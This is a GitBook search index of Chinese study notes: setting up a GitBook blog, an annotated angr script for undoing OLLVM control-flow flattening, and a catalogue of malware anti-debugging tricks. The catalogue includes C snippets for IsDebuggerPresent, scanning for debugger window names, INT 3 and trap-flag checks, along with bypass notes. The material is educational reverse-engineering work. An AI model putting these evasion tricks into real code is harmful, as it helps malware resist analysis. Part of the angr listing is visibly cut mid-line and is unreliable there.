{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction 欢迎来到我的gitbook，这是一个欢迎页，有任何问题或者建议以及bug可以通过邮件 crootkit@gmail.com 发我，不胜感激 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-18 11:15:01 "},"MyArticles/构建gitbook.html":{"url":"MyArticles/构建gitbook.html","title":"写在开始，how2gitbook","keywords":"","body":"如何在化工原理课堂构建gitbook作为自己的博客 hexo和gitbook对比 没啥好对比的，我就感觉hexo用起来比较方便，比如构建博客，挂在公网或者是github上比较方便；但是我认为那个适合作为一个交流平台，不适合用来笔记；所谓大道至简，hexo的便利性导致他的臃肿性。所以才来尝试使用gitbook来构建博客，与其说是博客，不如说是笔记系统，更加方便简单的笔记系统。 gitbook可以根据不同的类型进行分类，左边的目录支持二级目录（实践发现支持三级目录），小母鹿都在文章里的右边。 而且book对于文章的目录管理非常自由，只有buil的时候可以索引到就可以。 可能别的也可以，但是我不知道，如果任何人来找我关于这个进行争论，别怪我没素质下限 gitbook搭建准备 记录搭建的过程，方便以后快速搭建。或者以备不时之需。 环境准备 需要： github账号，就像是hexo那种####.github.io的那种GitHub page仓库。 npm和node环境，npm需要低版本，高版本的不能匹配gitbook。 脑子，百度，google，梯子 git everything，可以帮助我更加方便的找到安装的文件在哪一个目录里 工具下载 npm install gitbook-cli -g 这里注意需要配置环境变量，在 查看高级系统设置 里，添加对应的目录 之前建议npm进行换源，不然下载可能会出问题。 下载结束之后，在cmd里输入 gitbook --version 需要注意的是如果显示找不到gitbook这个命令，则需要仔细的看一下自己的path有没有填入正确的值。 这时gitbook会进行自己的一个安装和配置。 可能的报错 gitbook报错1： npm版本太高，导致安装失败。 gitbook报错2： 找到报错的那个js文件，进去之后把67行左右的三个连续的代码注释掉，注意，一定不能注释报错行的代码，不然就无法自行安装配置gitbook。 解决上述错误之后重复指令 gitbook --version 出现警告无所谓，等一等等他安装完成。就行。成功后应该是 如果只有第一行的话说明不行，需要重新走一遍--version。并且注意一下那个可能会报错的js文件。 本地环境 自己找一个想放置文章的目录，当做gitbook的本地目录。然后进入目录 我这里用的目录是D:\\myGitbook，进入目录执行： gitbook init 如果没有在目录下生成两个md文件，说明你配错了。建议全部删除然后在npm官网下载msi文件进行安装，而不是下载zip，至于为啥我也不知道，你要是知道可以给我发邮件 crootkit@gmail.com 不胜感激。 目录下的 SUMMARY.md是很重要的，他决定了gitbook左边的目录。通过研究这个文件，可以发现他是怎么对文章进行索引的，这也可以根据他的格式来看到如何索引到我们的文章，所以我在该目录下创建了一个新的目录用来放置我的md文章。 通过命令 gitbook build 可以对本地的项目进行build，这个命令也集合到了gitbook serve里，但是我还是喜欢先build一下。 serve命令可以在本地起一个端口，类似于hexo s命令。 可以在本地起一个服务进行预览。 类似与这样的形势，就是成功了。 下载插件 在稀土掘金上找到了说是需要的12个插件，我稍微删改了一下。 插件需要写在D:\\myGitbook\\book.json中，我的是这样的。 { \"plugins\": [ \"back-to-top-button\", \"chapter-fold\", \"code\", \"splitter\", \"-lunr\", \"-search\", \"search-pro\", \"custom-favicon\", \"tbfed-pagefooter\", \"popup\", \"-sharing\", \"sharing-plus\", \"intopic-toc\" ], \"pluginsConfig\": { \"favicon\": \"./icon/book.ico\", \"tbfed-pagefooter\": { \"copyright\": \"没有版权，随便复制，免费的知识应该共享\", \"modify_label\": \"该文章修订时间：\", \"modify_format\": \"YYYY-MM-DD HH:mm:ss\" }, \"sharing\": { \"douban\": true, \"facebook\": true, \"google\": true, \"pocket\": true, \"qq\": true, \"qzone\": true, \"twitter\": true, \"weibo\": true, \"all\": [ \"douban\", \"facebook\", \"google\", \"instapaper\", \"linkedin\", \"twitter\", \"weibo\", \"messenger\", \"qq\", \"qzone\", \"viber\", \"whatsapp\" ] } } } 然后执行一下gitbook install就可以按部就班的下载了。 当你想添加一个插件时，我是这样解决的： 首先讲原先的book文件改名 建立新的book文件然后写入要更新的插件，进行install操作 然后讲两个book合并 如果新增插件的数量不是很多，可以采用单独下载的方式然后将插件的名称合并到之前book中。 注意：如果在build的时候没有将之前的book合并的话，会出现之前的插件无法索引的情况。 根据网络因素决定下载速度。 下载完成执行 gitbook build gitbook serve 托管到drootkit.github.io 明确一点 进行build之后，会在目录下生成一个_book目录，里面有一个index文件，这个文件就是整个完整的网页。 所以我们只需要把这个目录里的内容同步到github上去就行。 目录里的内容不全是网页需要用到的内容，我们可以创建一个.gitignore里面包含一些不需要提交到网页上的文件。 注意：每一次的build都会刷新_book目录下的所有的文件，导致.git会消失，所以就新建一个目录，每次生成的东西有用的放进去，既省去了gitignore也防止了git每次被刷没。 在这个新的目录里，build之后将生成的文件直接复制进去就可以，但是需要注意的是不要把里面的.git给覆盖掉，里面的git文件夹经过第一次配置好之后，后续就可以直接进行push了，相对比较方便。 上线gitbook 进行build之后，进入_book文件夹： git init #初始化本地git仓库 方法有很多，反正只要把这些文件push上去就行。 至于github的配置，参考hexo的github配置，那个信息比较多。 git config --global user.name \"###\" git config --global user.email \"###@4444.***\" 绑定远程仓库 git remote add origin 你的远程仓库地址 绑定之后因为本地还是master，远程一般是main，所以改一下本地分支 git config --global init.defaultBranch main 然后就三件套 git add . git commit -m \"必须写注释，不然报错\" git push #用-f来强制覆盖之前远程仓库里的东西 然后网页登录看看仓库里有没有东西，有了之后等一会，直接去访问网址就可以访问到gitbook了。 可能的报错 remote 1 遇到push失败（常见于更新的时候） 尝试强制覆盖 git push -u origin main -f 即可成功 2 遇到的新问题，当存在两个名称一样的标题的时候，会自动定位到第一个标题，所以这里的可能的报错我将其后面跟上了remote 玩的开心 可能的自动化脚本 能我哪天把这个搞差不多清楚了还是要写一个自动化的脚本的。不然每次都要手动复制可太麻烦了，一不注意再把我的git覆盖掉，那可是真的操了狗了。 每次加入新的文章之后都要修改summary那个md也是一件麻烦事，但是麻烦带来的高度的可操作性，这一点还是很难平衡的。总之我感觉这个是比hexo要好用的，依赖没有hexo那么多，相对来说也方便配置一点。 import os # 删除git目录中的没有用的md文件，只上传html文件，效果一样（md和png） def cleanGit(): path = 'D:\\\\myGitbook\\\\commit_dir\\\\MyArticles' for root, dirs, files in os.walk(path): for name in files: if (name.endswith(\".md\") or name.endswith(\".png\")): print(name) print(os.path.join(root, name)) os.remove(os.path.join(root, name)) # 删除空目录 # for root, dirs, files in os.walk(path): # if not os.listdir(root): # os.rmdir(root) # 清理本地的build目录，文本和图片 def cleanLocal(): path = 'D:\\\\myGitbook\\\\localOpreat\\\\_book\\\\MyArticles' for root, dirs, files in os.walk(path): for name in files: if (name.endswith(\".md\") or name.endswith(\".png\")): print(name) print(os.path.join(root, name)) os.remove(os.path.join(root, name)) # 删除空目录 # for root, dirs, files in os.walk(path): # if not os.listdir(root): # os.rmdir(root) cleanGit() 删除空目录的代码会出问题，暂时就不写了。 因为每一次写文章都要走一遍过程，相对比较麻烦，于是决定每周向github更新一次或者啥时候开心了就向github推送更新一次。 可能的错误 1、 Error: EISDIR: illegal operation on a directory, read 出现这个错误，就是summary文件出现了 问题，里面可能是某一个目录的地址有问题，通过排查或者重写可以解决。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 22:01:22 "},"MyArticles/Reverse.html":{"url":"MyArticles/Reverse.html","title":"Reverse","keywords":"","body":"记录关于在CTF竞赛中的一些逆向题目的题解和一些在五湖四海学来的逆向知识。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-18 16:39:04 "},"MyArticles/Re/控制流平坦化.html":{"url":"MyArticles/Re/控制流平坦化.html","title":"反控制流平坦化学习-angr","keywords":"","body":"平坦化混淆 环境 ubuntu18（Windows上尚未成功） git clone https://github.com/obfuscator-llvm/obfuscator.git 编译上述项目然后make all（耗时较长） clang test.c -o test -mllvm -fla 基本结构 这是在静态分析中最恶心的一种方式，因为没有完美的脚本可以完全去除混淆的影响 OLLVM中使用到的一种代码保护方式，它还有2个兄弟-虚假控制流和指令替换，这3种保护方式可以累加，对于静态分析来说混淆后代码非常复杂。 控制流平坦化的主要思想就是以基本块为单位，通过一个主分发器来控制程序的执行流程。类似于VMP保护的一种形式。这种保护的缺点是混淆之后的程序结构图格式非常固定，可以根据架构进行反推逆向。 while+switch的结构，其中的switch可以理解为主分发器。通过ida观察可以很清楚的发现流程图都是正方形或者长方形。 通过简单代码的对比，不难发现混淆之后的区别 会看到出现了很多的while和if，符合了开头那张图，主分发器进行程序控制，执行完一个小块后返回主分发器 测试代码 #include int main() { char input[128]; printf(\"please input the string\\n\"); scanf(\"%s\", input); if(input[0] == 'f' && input[1] == 'l') { printf(\"frist input is right\\n\"); if(input[2] == 'a' && input[3] == 'g') { printf(\"second flag is right\\n\"); } else { printf(\"second flag is wrong\\n\"); } } else { printf(\"frist flag is wrong\\n\"); } return 0; } 利用clang分别进行正常编译和混淆编译 正常编译 混淆编译 看到经过混淆的程序的CFG图已经很方正了 deflat.py 复原程序主要会用到的脚本是deflat.py其中的主要原理就是angr。 脚本分析 这种脚本有很多的版本，这里随便找了一个版本来做，每一个版本的基本原理基本一致。这个是python3版本。 为了方便分析，已经把主要结构和会用到的函数合并到同一个代码里了。 #!/usr/bin/env python3 import sys sys.path.append(\"..\") import argparse import angr import pyvex import claripy import struct from collections import defaultdict import am_graph from util import * import logging logging.getLogger('angr.state_plugins.symbolic_memory').setLevel(logging.ERROR) # logging.getLogger('angr.sim_manager').setLevel(logging.DEBUG) def get_relevant_nop_nodes(supergraph, pre_dispatcher_node, prologue_node, retn_node): # 创建 相关列表 和 nop列表 并且这俩列表返回到主函数 relevant_nodes = [] nop_nodes = [] # 遍历超图中的每一个节点 for node in supergraph.nodes(): # 检查当前节点到pre_dispatcher_node是不是存在边，判断节点是否在关键执行路径上 # 通过对节点的大小是不是大于8，来二次判断是不是有意义的节点，还是虚假的节点 if supergraph.has_edge(node, pre_dispatcher_node) and node.size > 8: # XXX: use node.size is faster than to create a block relevant_nodes.append(node) continue # 对于不是相关节点的点，检查是否是应该排除的节点（与关键执行路径无关的代码） if node.addr in (prologue_node.addr, retn_node.addr, pre_dispatcher_node.addr): continue # 不是上述节点，则当作是可以进行nop的节点 nop_nodes.append(node) return relevant_nodes, nop_nodes def symbolic_execution(project, relevant_block_addrs, start_addr, hook_addrs=None, modify_value=None, inspect=False): def retn_procedure(state): # 删除先前使用 project.hook() 设置的挂钩。这里通过一个没有修改的hook达到遇见call直接返回的目的 ip = state.solver.eval(state.regs.ip) project.unhook(ip) return # 在符号执行期间检查处于 angr 状态的语句 def statement_inspect(state): # 提取正在检查的语句的表达式组成列表放到expressions中 expressions = list(state.scratch.irsb.statements[state.inspect.statement].expressions) # 表达式列表的长度不为零且第一个表达式的类型为 pyvex.expr.ITE（表示 VEX 中间语言中的 if-then-else 表达式） if len(expressions) != 0 and isinstance(expressions[0], pyvex.expr.ITE): # 将 modify_value 分配给表示 angr 状态下的条件表达式的临时变量。来达到修改条件表达式的值的目的 state.scratch.temps[expressions[0].cond.tmp] = modify_value # 删除为正在检查的语句设置的断点，以便将来不会对同一语句再次进行检查 state.inspect._breakpoints['statement'] = [] # 判断是否存在hook地址，默认不存在 if hook_addrs is not None: # 根据不同的架构选择不同的长度 skip_length = 4 if project.arch.name in ARCH_X86: skip_length = 5 # hook表中所有的跳转地址 for hook_addr in hook_addrs: # 程序运行到这里跳转到hook project.hook(hook_addr, retn_procedure, length=skip_length) # 在起始地址 start_addr 处初始化空白状态并删除 LAZY_SOLVES 选项 state = project.factory.blank_state(addr=start_addr, remove_options={angr.sim_options.LAZY_SOLVES}) # 如果 inspect 为 True，则在每个语句处设置一个断点，以允许在每个语句处检查程序状态 if inspect: # 当符号执行到达语句执行事件时，会调用statement_inspect函数；根据modify_value参数修改正在执行的语句中的ITE表达式 state.inspect.b('statement', when=angr.state_plugins.inspect.BP_BEFORE, action=statement_inspect) # 从给定的 start_addr 开始执行符号执行 sm = project.factory.simulation_manager(state) # 一步一步的来执行，方便控制 sm.step() while len(sm.active) > 0: for active_state in sm.active: # 状态到达 relevant_block_addrs 中的地址之一，则返回该地址 if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() # 没有任何状态到达 relevant_block_addrs 中，则返回 None return None def fill_nop(data, start_addr, length, arch): # 先判断程序架构是x86还是arm if arch.name in ARCH_X86: # 遍历地址，将nop指令转换成字节码写进去 for i in range(0, length): data[start_addr + i] = ord(OPCODES['x86']['nop']) elif arch.name in ARCH_ARM | ARCH_ARM64: # 同上 if arch.name in ARCH_ARM: nop_value = OPCODES['arm']['nop'] else: nop_value = OPCODES['arm64']['nop'] # 判断大小端序 if arch.memory_endness == \"Iend_BE\": nop_value = nop_value[::-1] # arm架构的对其特性，x86就没这毛病 for i in range(0, length, 4): data[start_addr+i] = nop_value[0] data[start_addr+i+1] = nop_value[1] data[start_addr+i+2] = nop_value[2] data[start_addr+i+3] = nop_value[3] def ins_j_jmp_hex_x86(cur_addr, target_addr, j_cond): # 获得跳转指令的字节码 if j_cond == 'jmp': j_opcode = OPCODES['x86']['jmp'] j_ins_size = 5 else: j_opcode = OPCODES['x86']['j'] + OPCODES['x86'][j_cond] j_ins_size = 6 # 计算跳转的偏移 jmp_offset = target_addr - cur_addr - j_ins_size # 计算跳转在程序中的真正偏移(计算上指令本身) patch_ins_hex = j_opcode + struct.pack(' target_addr: patch_ins_hex = struct.pack('> 12 分析 该主要是使用了angr符号执行的一些方式。具体思路可以总结为按照平坦化混淆之后的CFG结构来进行反混淆，这种方式对于混淆的手法有一定的依赖性，如果微调混淆结构，那么这个脚本就寄了。或者不能高度还原了。 顺序 定位序言快，结束快，真实代码快。剩下的就是垃圾快 函数的开始地址为序言的地址 序言的后继为主分发器 后继为主分发器的块为预处理器 后继为预处理器的块为真实块 无后继的块为retn块 剩下的为无用块 这里可以充分利用ida里的 synchronize with 功能，然后点击下面的真实代码，就可以在伪c代码中定位到相关的代码了。 CFG 程序控制流图CFG angr中的CFG分为2种： CFGFast CFGAccurate 两者的区别在于前者计算的东西更少，从而也就更快。一般情况下CFGFast就够了，但在研究中若要依靠CFG进一步分析的话可能就需要了，更精准当然也就更慢 CFG()是CFGFast()的子类，也就是在CFGFast()基础上的一个包装。利用CGF将程序变成二维之后，就可以后续找块找边了。 找头尾 # 获取函数序言和函数尾声（push 和 ret） # 遍历图中的每个节点 prologue_node = None for node in supergraph.nodes(): # 找到函数序言的节点（函数执行的第一个基本块） # in_degree方法返回节点的“入边数”，没有入边，就是第一个块 if supergraph.in_degree(node) == 0: prologue_node = node # 找到函数尾声 # 检查块的出边，为0则说明是最后一个；检查有没有条件分支离开。同时满足为尾声 if supergraph.out_degree(node) == 0 and len(node.out_branches) == 0: retn_node = node 这里通过判断一个节点有没有入边或者出边来判断，头节点没有入边，尾节点没有出边，这个边的概念在fuzz中有明确的解释和定义，用的也更多一些。 然后将定位到的头节点（序言）和给出地址是否一致，不一致就报错 # 在平坦化中，首先要经过一个调度器去执行代码，所以这里检索紧跟在函数序言之后的节点列表，并得到其中的第一个作为调度节点 main_dispatcher_node = list(supergraph.successors(prologue_node))[0] # 遍历 main_dispatcher_node 的每个前驱节点 # 找到紧接在主调度程序节点之前的节点，该节点通常是根据输入状态为调度程序设置参数的节点。 for node in supergraph.predecessors(main_dispatcher_node): # 检查节点的地址是否与函数序言的地址不同，用于排除可能由于不相关的分支而被包含的节点，获得预调度器 if node.addr != prologue_node.addr: pre_dispatcher_node = node break 找到有用块 一般脚本都是通过从块中提取出有用项，将剩下的作为无用项的工作方法。 针对call指令：通过hook后unhook 的形式直接返回，防止符号执行跑出指定范围 def retn_procedure(state): # 删除先前使用 project.hook() 设置的挂钩。这里通过一个没有修改的hook达到遇见call直接返回的目的 ip = state.solver.eval(state.regs.ip) project.unhook(ip) return 发现合法块的主要代码 # 遍历相关节点中的所有节点，不包括返回函数尾声 for relevant in relevants_without_retn: print('-------------------dse %#x---------------------' % relevant.addr) # 每一块当作一个block，创建一个工厂，设置地址和大小 block = project.factory.block(relevant.addr, size=relevant.size) # 设置的一个标志位，检查当前块是否有分支 has_branches = False # 设置一个需要hook地址字典 hook_addrs = set([]) # 遍历当前块中的指令，利用capstone将字节转为汇编代码 for ins in block.capstone.insns: # 基本指令块中是否有任何条件分支（如 cmov 或 mov）或函数调用（如 call 或 bl） if project.arch.name in ARCH_X86: if ins.insn.mnemonic.startswith('cmov'): # 只记录第一个指令分支 if relevant not in patch_instrs: patch_instrs[relevant] = ins # 将标志 has_branches 设置为 True has_branches = True elif ins.insn.mnemonic.startswith('call'): hook_addrs.add(ins.insn.address) elif project.arch.name in ARCH_ARM: if ins.insn.mnemonic != 'mov' and ins.insn.mnemonic.startswith('mov'): if relevant not in patch_instrs: patch_instrs[relevant] = ins has_branches = True elif ins.insn.mnemonic in {'bl', 'blx'}: hook_addrs.add(ins.insn.address) elif project.arch.name in ARCH_ARM64: if ins.insn.mnemonic.startswith('cset'): if relevant not in patch_instrs: patch_instrs[relevant] = ins has_branches = True elif ins.insn.mnemonic in {'bl', 'blr'}: hook_addrs.add(ins.insn.address) # 有分支会用两次来执行，分别走两个路径 if has_branches: tmp_addr = symbolic_execution(project, relevant_block_addrs, relevant.addr, hook_addrs, claripy.BVV(1, 1), True) if tmp_addr is not None: flow[relevant].append(tmp_addr) tmp_addr = symbolic_execution(project, relevant_block_addrs, relevant.addr, hook_addrs, claripy.BVV(0, 1),True) if tmp_addr is not None: flow[relevant].append(tmp_addr) else: tmp_addr = symbolic_execution(project, relevant_block_addrs, relevant.addr, hook_addrs) if tmp_addr is not None: flow[relevant].append(tmp_addr) 把注释删了方便看。通过一个大循环，遍历所有的代码块，然后同时遍历代码块中的代码。如果遇到分支块就进行两次符号执行来遍历所有路径。 程序利用relevant_block_addrs列表存储了所有的有效代码块，他的检查原理是 # 遍历超图中的每一个节点 for node in supergraph.nodes(): # 检查当前节点到pre_dispatcher_node是不是存在边，判断节点是否在关键执行路径上 # 通过对节点的大小是不是大于8，来二次判断是不是有意义的节点，还是虚假的节点 if supergraph.has_edge(node, pre_dispatcher_node) and node.size > 8: # XXX: use node.size is faster than to create a block relevant_nodes.append(node) continue 两个判断条件 当前节点和预处理器是不是存在边（有效块是存在的，除了retn块） 节点的大小是不是>8 来对挑选出有效块，然后来到上面这个嵌套循环的代码中。 关于symbolic_execution函数，最后一个参数来判断是不是存在分支，倒数第二个参数判断分支走向（t or f） def symbolic_execution(project, relevant_block_addrs, start_addr, hook_addrs=None, modify_value=None, inspect=False): def retn_procedure(state): # 删除先前使用 project.hook() 设置的挂钩。这里通过一个没有修改的hook达到遇见call直接返回的目的 ip = state.solver.eval(state.regs.ip) project.unhook(ip) return # 在符号执行期间检查处于 angr 状态的语句 def statement_inspect(state): # 提取正在检查的语句的表达式组成列表放到expressions中 expressions = list(state.scratch.irsb.statements[state.inspect.statement].expressions) # 表达式列表的长度不为零且第一个表达式的类型为 pyvex.expr.ITE（表示 VEX 中间语言中的 if-then-else 表达式） if len(expressions) != 0 and isinstance(expressions[0], pyvex.expr.ITE): # 将 modify_value 分配给表示 angr 状态下的条件表达式的临时变量。来达到修改条件表达式的值的目的 state.scratch.temps[expressions[0].cond.tmp] = modify_value # 删除为正在检查的语句设置的断点，以便将来不会对同一语句再次进行检查 state.inspect._breakpoints['statement'] = [] # 判断是否存在hook地址，默认不存在 if hook_addrs is not None: # 根据不同的架构选择不同的长度 skip_length = 4 if project.arch.name in ARCH_X86: skip_length = 5 # hook表中所有的跳转地址 for hook_addr in hook_addrs: # 程序运行到这里跳转到hook project.hook(hook_addr, retn_procedure, length=skip_length) # 在起始地址 start_addr 处初始化空白状态并删除 LAZY_SOLVES 选项 state = project.factory.blank_state(addr=start_addr, remove_options={angr.sim_options.LAZY_SOLVES}) # 如果 inspect 为 True，则在每个语句处设置一个断点，以允许在每个语句处检查程序状态 if inspect: # 当符号执行到达语句执行事件时，会调用statement_inspect函数；根据modify_value参数修改正在执行的语句中的ITE表达式 state.inspect.b('statement', when=angr.state_plugins.inspect.BP_BEFORE, action=statement_inspect) # 从给定的 start_addr 开始执行符号执行 sm = project.factory.simulation_manager(state) # 一步一步的来执行，方便控制 sm.step() while len(sm.active) > 0: for active_state in sm.active: # 状态到达 relevant_block_addrs 中的地址之一，则返回该地址 if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() # 没有任何状态到达 relevant_block_addrs 中，则返回 None return None 后续代码中通过单步步过来判断地址是否在有效块地址中，来修复块之间的流程关系。 # 从给定的 start_addr 开始执行符号执行 sm = project.factory.simulation_manager(state) # 一步一步的来执行，方便控制 sm.step() while len(sm.active) > 0: for active_state in sm.active: # 状态到达 relevant_block_addrs 中的地址之一，则返回该地址 if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() # 没有任何状态到达 relevant_block_addrs 中，则返回 None 修复流程图 修复流程图的思路是通过将垃圾块进行nop填充，然后重新连接真实代码块。 无跳转的真实代码块后添加jmp指令跳转到下一个真实块 有跳转代码块：将CMOV指令改成相应的条件跳转指令跳向符合条件的分支，再在这条之后添加JMP指令跳向另一分支 完事就能得到一个被修复的代码结构了，但是可能会导致堆栈不平衡，如果平坦化时利用了堆栈或者脚本运行并不那么靠谱。 缺点 参考这位师傅的博客发现这种方式的缺点，之前在运用中确实用到过这些问题，但是并没有去研究观察过。 这篇文章提出了几个问题： angr对arm64指令集的支持不大行 当前的反混淆模式是基于结构特征的，当多次混淆之后就失效了。 patch程序和nop的方式针对简单程序是好用的，但是当一个真实块拥有三个及以上后继节点（通常是一个公共基本块）时，就无法直接patch。 可以通过保存真实块然后重构函数体的关系解决，但是这需要半手动半自动的方式解决。 最后这个师傅给出的解决办法是 利用Unicorn模拟执行框架，记录真实代码块进行复原。有机会研究研究。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-29 18:16:18 "},"MyArticles/Re/反调试 & 沙箱对抗技巧收集.html":{"url":"MyArticles/Re/反调试 & 沙箱对抗技巧收集.html","title":"反调试以及沙箱对抗技巧收集","keywords":"","body":"（一）反调试 在攻击中，为了防止自己恶意代码的泄露，会对攻击样本本身进行反调试和混淆操作。 一、API反调试 IsDebuggerPresent BOOL IsDebuggerPresent(); 经典的反调试API，查询进程环境块(PEB)中的IsDebugged标志。 没有运行在调试器环境中，函数返回0； 调试附加了进程，函数返回一个非零值。 这个直接通过修改返回值可以绕过。或者直接利用“隐藏调试器”选项就可以 CheckRemoteDebuggerPresent 和上述API实现过程基本一致 BOOL CheckRemoteDebuggerPresent( [in] HANDLE hProcess, // 进程的句柄。 [in, out] PBOOL pbDebuggerPresent // 进程被调试则返回TRUE ); 通过修改寄存器的值也可以绕过。比较简单。 NtQueryInformationProcess 这是一个没有公开的在ntdll.dll中的api，可以用来获取程序中指定的结构体内容。 可以利用他读取一些程序中的内容来判断调试技术。直接利用“隐藏调试器”选项就可以 GetLastError 这个需要和几个API搭配使用。 OutputDebugStringA SetLastError GetLastError 如果没有调试进程的话，这个api就会报错，可以提前使用SetLastError来提前设置一个错误值。 void OutputDebugStringA( [in, optional] LPCSTR lpOutputString ); 完事最后利用GetLastError来获取错误值，如果调试的话，这里就会出现问题。 常见搭配： BOOL IsDebugger() { DWORD errorValue = 2234; SetLastError(errorValue); OutputDebugString(\"Test for debugger!\"); return (GetLastError() == errorValue)?TRUE:FALSE; } 类似的模板也可以搭配其他的API函数来使用。 绕过也简单，这个不会直接修改程序，直接修改返回值就行。不能直接利用“隐藏调试器”选项了。 ZwSetInformationThread 设置线程的优先级。通过为线程设置 ThreadHideFromDebugger，可以禁止线程产生调试事件。 NTSYSAPI NTSTATUS ZwSetInformationThread( [in] HANDLE ThreadHandle, [in] THREADINFOCLASS ThreadInformationClass, [in] PVOID ThreadInformation, [in] ULONG ThreadInformationLength ); 原理：调试进程就会被分离出来。该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试 绕过方式：第 2 个参数为 ThreadHideFromDebugger，其值为 0x11。直接修改这个值就可以 debugActiveProcessStop 停止调试器指定的进程 BOOL DebugActiveProcessStop( [in] DWORD dwProcessId // 想停止的调试进程的进程号 ); 函数失败，则返回值为零 查找窗体信息 FindWindow 检索顶级窗口的句柄，该窗口的类名称和窗口名称与指定的字符串匹配。 此函数不搜索子窗口。 此函数不执行区分大小写的搜索。 HWND FindWindowW( [in, optional] LPCWSTR lpClassName, [in, optional] LPCWSTR lpWindowName ); 直接用它和一些调试器的名称进行比较就行。绕过也是直接修改返回值或者是修改字符串。 EnumWindows 通过将句柄传递到应用程序定义的回调函数，枚举屏幕上的所有顶级窗口。 枚举枚举 到最后一个顶级窗口或回调函数返回 FALSE 为止。并将窗口句柄传送给应用程序定义的回调函数。 BOOL EnumWindows( [in] WNDENUMPROC lpEnumFunc, [in] LPARAM lParam ); 常用代码结构。 BOOL CALLBACK EnumWndProc(HWND hwnd, LPARAM lParam) { char cur_window[1024]; GetWindowTextA(hwnd, cur_window, 1023); if (strstr(cur_window, \"WinDbg\")!=NULL || strstr(cur_window, \"x64_dbg\")!=NULL || strstr(cur_window, \"OllyICE\")!=NULL || strstr(cur_window, \"OllyDBG\")!=NULL || strstr(cur_window, \"Immunity\")!=NULL) { *((BOOL*)lParam) = TRUE; } return TRUE; } 查找进程信息 遍历进程列表 通过进程快照来遍历进程列表，通过字符串比较来判断，绕过直接修改字符串就行 查看父进程 Windows一般默认的父进程就是explore，同时STARTUPINFO结构体的信息也是0。 这个也好绕过，直接修改字符串或者是绕过就行了。 代码校验和检查 计算代码段的校验并实现与扫描中断相同的目的。与扫描0xCC不同，这种检查仅执行恶意代码中机器码CRC或者MD5校验和检查。 时钟检测 如下两种用时钟检测来探测调试器存在的方法。 记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器。 记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。 rdtsc 这是一个汇编指令。 它返回至系统重新启动以来的时钟数，并且将其作为一个64位的值存入EDX:EAX中。恶意代码运行两次rdtsc指令，然后比较两次读取之间的差值。 QueryPerformanceCounter和GetTickCount QueryPerformanceCounter：检索性能计数器的当前值，这是一个高分辨率 ( BOOL QueryPerformanceCounter( [out] LARGE_INTEGER *lpPerformanceCount // 接收当前性能计数器值的变量的指针 ); GetTickCount：检索自系统启动以来已用过的毫秒数，最长为 49.7 天。 DWORD GetTickCount(); 二、手工反调试 手动检查相关结构 使用上述提到的检测调试的api很容易被发现绕过，所以可以手动的实现上述api的功能。 比如检查ProcessHeap位于PEB结构的0x18处。第一个堆头部有一个属性字段，它告诉内核这个堆是否在调试器中创建。 在不同的环境下会显示不同的值。 软件断点检查 恶意代码常用的一种反调试技术是在它的代码中查找机器码0xCC，来扫描调试器对它代码的INT 3修改。repne scasb指令用于在一段数据缓冲区中搜索一个字节。EDI需指向缓冲区地址，AL则包含要找的字节，ECX设为缓冲区的长度。当ECX=0或找到该字节时，比较停止。 硬件断点检查 在Windows下通过获取当前上下文信息context来获得到DR0-DR7这些寄存器的信息。如果没有硬件断点，则这几个寄存器的值都是0。 使用TLS回调 通过注册TLS回调函数在函数入口点之前执行代码，可以起到目的。但是可以将断点设置TLS开始的位置来断住，ida分析也很简单。 一般来说正常编译的程序会开启TLS功能，这时就可以找到TLS表，TLS的结构如下： typedef struct _IMAGE_TLS_DIRECTORY64 { ULONGLONG StartAddressOfRawData; ULONGLONG EndAddressOfRawData; ULONGLONG AddressOfIndex; // PDWORD ULONGLONG AddressOfCallBacks; // PIMAGE_TLS_CALLBACK *; DWORD SizeOfZeroFill; union { DWORD Characteristics; struct { DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; } IMAGE_TLS_DIRECTORY64; typedef struct _IMAGE_TLS_DIRECTORY32 { DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; // PDWORD DWORD AddressOfCallBacks; // PIMAGE_TLS_CALLBACK * DWORD SizeOfZeroFill; union { DWORD Characteristics; struct { DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; } IMAGE_TLS_DIRECTORY32; typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32; 可以通过在源代码中添加或者在二进制程序中手动添加。这个后续再说。 中断 调试器使用INT 3来设置软件断点，所以一种反调试技术就是在合法代码段中插入0xCC(INT 3)欺骗调试器，使其认为这些0xCC机器码是自己设置的断点。在CTF竞赛中时常会见到这个反调试手段。 BOOL CheckDebug() { __try { __asm int 3 } __except(1) { return FALSE; } return TRUE; } 上述代码中，程序正常执行的话，执行到int3的时候，会触发异常返回FALSE，但是在调试器存在的情况下，可能会返回TRUE。 按照 上述思路，还可以使用其他方式触发异常来控制程序流达到反调试的目的。 例如jmp到非法地址，除以0之类的方式。 陷阱标志位 EFLAGS寄存器的第八个比特位是陷阱标志位。如果设置了，就会产生一个单步异常。 这个异常就是f8和f7的实现原理。 BOOL CheckDebug() { __try { __asm { pushfd or word ptr[esp], 0x100 popfd nop } } __except(1) { return FALSE; } return TRUE; } 修改文件结构 有些调试器比如OD，严格按照COFF的文件格式来读取文件的，所以可以修改程序的结构，进行变异来禁止调试器启动。 可选头的最后一项 - NumberOfRvaAndSizes 他标记了后面DataDirectory数组中的元素个数 当NumberOfRvaAndSizes大于0x10时，Windows加载器将会忽略NumberOfRvaAndSizes。 